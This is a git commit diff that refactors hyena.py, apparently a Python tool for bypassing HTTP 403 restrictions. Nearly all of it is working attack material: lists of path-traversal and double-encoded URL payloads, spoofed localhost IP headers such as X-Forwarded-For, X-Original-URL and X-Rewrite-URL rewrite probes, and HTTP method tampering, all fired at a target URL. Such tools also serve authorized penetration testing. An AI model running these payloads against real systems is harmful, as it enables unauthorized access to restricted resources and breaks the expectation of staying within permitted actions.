9a9ee4c1915c14a1ce134a6966452087d9eead30
Vic <Kawemirs@gmail.com>
2021-05-12 10:01:40 +0700

    Refactored

--- hyena.py
+++ hyena.py
@@ -6,9 +6,15 @@ first = ["%2e/", "%252e/", "%2e%2f", "%2e%c0%af", "%252e%c0%af"]
 pre_path = ["..;/", "%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
 past_path = ["pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa%c1%9clupa%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c", "/"]
 replace_slash = ["?", "??", "\\", "/\".hithere", "..;/"]
+headers = [{ 'X-Custom-IP-Authorization': "127.0.0.1" },
+           { 'X-Originationg-IP': "127.0.0.1" },
+           { 'X-Forwarded-For': "127.0.0.1" },
+           { 'X-Remote-IP': "127.0.0.1" },
+           { 'X-Client-IP': "127.0.0.1" },
+           { 'X-Host': "127.0.0.1" },
+           { 'X-Forwarded-Host': "127.0.0.1" }]
 response_codes = {}
 to_ignore = [400, 403, 404]
-full_path = ""
 timeout = 10
 cookie = ""
 data = ""
@@ -46,47 +52,6 @@ def get_args():
     
     return arguments
 
-
-def print_status_codes():
-    print("Done\nResponses:")
-    for code in response_codes:
-        print("[{}] - {} times".format(code, response_codes[code]))
-
-def get_last(url):
-    parts = re.search('(.+)(\/.+)$', url)
-    return parts.group(1), parts.group(2)
-
-def get_main(url):
-    slash = re.search('(.+\..+?\/)(.*)', url)
-    return slash.group(1), slash.group(2)
-
-def basic_tests(url, main, rest, butlast):
-    global data
-    rtype = reqtype
-    if data != "" and rtype == "get":
-        rtype = "post"
-    access_test(url, "post")
-    access_test(url, "head")
-    access_test(url, "options")
-    access_test(url, "put")
-    access_test(url, "patch")
-    access_test(url, rtype, { 'Referer': butlast })
-    access_test(url, rtype, { 'X-Custom-IP-Authorization': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Originationg-IP': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Forwarded-For': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Remote-IP': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Client-IP': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Host': "127.0.0.1" })
-    access_test(url, rtype, { 'X-Forwarded-Host': "127.0.0.1" })
-    if rtype == "get":
-        content_length = len(access_test(main, "get", {}, False).content)
-        response = access_test(main, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }, False)
-        if len(response.content) != content_length:
-            print("\nContent-length differ on {} with {} request and header {}".format(main, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }))
-        response = access_test(main, "get", { 'X-Original-URL': '/{}'.format(rest) }, False)
-        if len(response.content) != content_length:
-            print("\nContent-length differ on {} with {} request and header {}".format(main, "get", { 'X-Original-URL': '/{}'.format(rest) }))
-    
 def through_file(fname):
     try: 
         with open(fname, 'r') as f:
@@ -95,37 +60,68 @@ def through_file(fname):
     except:
         print("[-] Error: Unable to open file {}".format(fname))
 
+def print_status_codes():
+    for code in response_codes:
+        print("[{}] - {} times".format(code, response_codes[code]))
+
+def get_last(url):
+    parts = re.search('(.+)(\/.+)$', url)
+    return parts.group(1), parts.group(2)
+
+def get_host(url):
+    slash = re.search('(.+\..+?\/)(.*)', url)
+    return slash.group(1), slash.group(2)
+
+def rewrite_url_test(host, rest):
+    content_length = len(access_test(host, "get", {}, False).content)
+    if content_length != len(access_test(host, "get", {}, False).content):
+        print("{} url content is not stable".format(host))
+        return
+    # X-Rewrite-URL header
+    response = access_test(host, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }, False)
+    if len(response.content) != content_length:
+        print("\nContent-length differ on {} with {} request and header {}".format(host, "get", { 'X-Rewrite-URL': '/{}'.format(rest) }))
+    # X-Original-URL header        
+    response = access_test(host, "get", { 'X-Original-URL': '/{}'.format(rest) }, False)
+    if len(response.content) != content_length:
+        print("\nContent-length differ on {} with {} request and header {}".format(host, "get", { 'X-Original-URL': '/{}'.format(rest) }))    
+
+def basic_tests(url, host, rest, butlast):
+    requests_list = ["post", "head", "options", "put", "patch"]
+    
+    for req in requests_list:
+        access_test(url, req)
+    for header in headers:
+        access_test(url, reqtype, header)
+    access_test(url, reqtype, { 'Referer': butlast })
+    
+    if reqtype == "get":
+        rewrite_url_test(host, rest)
+
 def directory_test(url):
-    global full_path
     directory = True if url[-1] is '/' else False
-    response_codes = {}
-    full_path = url
     path, last = get_last(url)
-    main, rest = get_main(url)
+    host, rest = get_host(url)
 
     print("[Testing] {}".format(url))
-    basic_tests(url, main, rest, path)
+    basic_tests(url, host, rest, path)
+
+    if url[-1] is '/':
+        url = url[:-1]
 
     for f in first:
-        access_test(url.replace(main, main + f))
+        access_test(url.replace(host, host + f))
 
     for p in past_path:
-        if directory:                
-            access_test(url + p)
-        else:
             access_test(url + "/" + p)
 
     for r in replace_slash:
-        if directory:
-            access_test(url[:-1] + r)
-        else:
             access_test(url + r)
 
     for pre in pre_path:
+        npath = path + "/" + last.replace('/', pre)
         if directory:
-            npath = path + "/" + last[:-1].replace('/', pre) + "/"
-        else:
-            npath = path + "/" + last.replace('/', pre)
+            npath = npath + "/"
         access_test(npath)
 
 def request(path, rtype = reqtype, h = {}):
@@ -137,19 +133,16 @@ def request(path, rtype = reqtype, h = {}):
         response = requests.get(path, headers=h, timeout=timeout)
     elif rtype == "post":
         if data == "":
-            if h == "":
-                h = { 'Content-Length': '0' }
-            else:
-                h['Content-Length'] = '0'
-        response = requests.post(path, headers={ h }, data=data, timeout=timeout)
-    elif rtype == "head":
-        response = requests.head(path, timeout=timeout, headers=h)
-    elif rtype == "options":
-        response = requests.options(path, timeout=timeout, headers=h)
+            h['Content-Length'] = '0'
+        response = requests.post(path, timeout=timeout, data=data, headers=h)
     elif rtype == "put":
         response = requests.put(path, timeout=timeout, data=data, headers=h)
     elif rtype == "patch":
         response = requests.patch(path, timeout=timeout, data=data, headers=h)
+    elif rtype == "head":
+        response = requests.head(path, timeout=timeout, headers=h)
+    elif rtype == "options":
+        response = requests.options(path, timeout=timeout, headers=h)
     else:
         return "error"
     return response
@@ -181,9 +174,11 @@ def main():
         if args.target:
             directory_test(args.target)
         else:
-            through_file(args.targets)
+            through_file(args.targets)            
+        print("Done\nResponses:")
         print_status_codes()
     except KeyboardInterrupt:
+        print_status_codes()
         print("\nAborted\n")
         
 if __name__ == "__main__":
